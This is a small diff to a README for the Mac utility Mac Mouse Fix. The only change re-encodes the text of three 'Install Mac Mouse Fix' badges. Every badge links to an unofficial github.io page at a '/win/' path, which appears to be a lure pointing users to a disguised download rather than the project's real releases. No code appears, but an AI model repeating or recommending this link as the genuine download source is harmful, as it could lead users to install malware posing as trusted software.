@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Mac Mouse Fix](https://img.shields.io/badge/⬇_Install_Mac%20Mouse%20Fix-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Mac Mouse Fix](https://img.shields.io/badge/⬇_Install_Mac+Mouse+Fix-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Mac Mouse Fix is a free and paid macOS utility that dramatically improves the fe
 
 <div align="center">
 
-[![⬇ Install Mac Mouse Fix](https://img.shields.io/badge/⬇_Install_Mac%20Mouse%20Fix-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Mac Mouse Fix](https://img.shields.io/badge/⬇_Install_Mac+Mouse+Fix-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Mac Mouse Fix is a free and paid macOS utility that dramatically improves the fe
 
 <div align="center">
 
-[![⬇ Install Mac Mouse Fix](https://img.shields.io/badge/⬇_Install_Mac%20Mouse%20Fix-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Mac Mouse Fix](https://img.shields.io/badge/⬇_Install_Mac+Mouse+Fix-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
